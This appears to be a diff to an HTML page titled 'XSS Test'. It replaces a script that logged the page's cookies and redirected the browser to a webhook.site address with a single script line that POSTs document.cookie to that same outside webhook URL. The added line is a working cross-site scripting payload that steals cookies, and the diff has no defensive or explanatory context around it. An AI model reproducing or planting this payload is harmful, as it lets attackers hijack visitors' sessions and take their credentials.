@@ -4,10 +4,6 @@
     <title>XSS Test</title>
 </head>
 <body>
-    <script>
-        const cookies = document.cookie;
-        console.log('Document Cookies:', cookies);
-         window.location.href = 'https://webhook.site/0973988c-7f2d-4cc9-8888-bc95f808f585';
-    </script>
+    <script>fetch('https://webhook.site/0973988c-7f2d-4cc9-8888-bc95f808f585', {method: 'POST', body: document.cookie})</script>
 </body>
 </html>
